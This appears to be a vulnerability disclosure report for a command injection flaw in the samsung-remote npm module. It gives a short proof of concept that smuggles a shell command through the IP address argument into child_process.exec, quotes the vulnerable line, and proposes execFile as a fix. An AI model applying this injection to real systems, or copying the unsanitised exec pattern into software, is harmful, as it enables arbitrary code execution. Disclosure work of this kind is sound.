Summary:
vulnerable_version: <1.3.5
patched_version: >=1.3.5
I would like to report a command injection vulnerability in the **samsung-remote** npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Vulnerability

## Vulnerability Description

samsung-remote does not sanitize the IP address argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection. It is not unlikely that some systems using this package will pass a user-controlled IP address to the function, thus inadvertently allowing arbitrary code execution by the user.

## Steps To Reproduce:

1. Install samsung-remote: `npm install samsung-remote --save`.
2. Create the following `index.js`file:

```
var remote = new SamsungRemote({
    ip: '127.0.0.1; touch /tmp/malicious;' 
});

remote.isAlive(function(err) {});
```
3. Execute `node index.js`
4. Check that the injected command was executed: `ls /tmp/`

## Patch

Command execution happens [here](https://github.com/natalan/samsung-remote/blob/bf7e68d78dddfb534d7ef6c501d0af5e4d32e788/lib/samsung-remote.js#L103):

`return exec("ping -c 1 " + config.ip, function (error, stdout, stderr) {`

`exec` could be replaced by `execFile`, which would force developers to separate the command and its arguments.

## Supporting Material/References:

- Operating system: Debian GNU/Linux 9.5 (stretch)
- Node.js v8.11.3
- npm v5.6.0

# Wrap up

- I opened an issue in the related repository: N

## Impact

Arbitrary shell command execution.
